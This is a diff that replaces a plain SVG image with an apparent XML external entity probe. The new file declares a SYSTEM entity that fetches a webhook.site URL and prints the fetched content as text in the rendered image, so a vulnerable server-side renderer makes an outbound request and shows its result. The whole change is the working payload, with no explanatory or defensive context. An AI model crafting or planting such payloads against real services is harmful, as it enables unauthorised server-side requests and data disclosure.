@@ -1,6 +1,7 @@
-<svg xmlns="http://www.w3.org/2000/svg"
-     xmlns:xlink="http://www.w3.org/1999/xlink"
-     width="500" height="500">
-  <image xlink:href="https://httpbin.org/image/png"
-         x="0" y="0" width="500" height="500"/>
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [<!ENTITY x SYSTEM "https://webhook.site/6e26c36e-0e92-4615-9b05-c67001ed82fc">]>
+<svg xmlns="http://www.w3.org/2000/svg" width="800" height="300">
+  <rect width="800" height="300" fill="#111"/>
+  <text x="10" y="60" fill="white" font-size="14"
+        font-family="monospace">&x;</text>
 </svg>
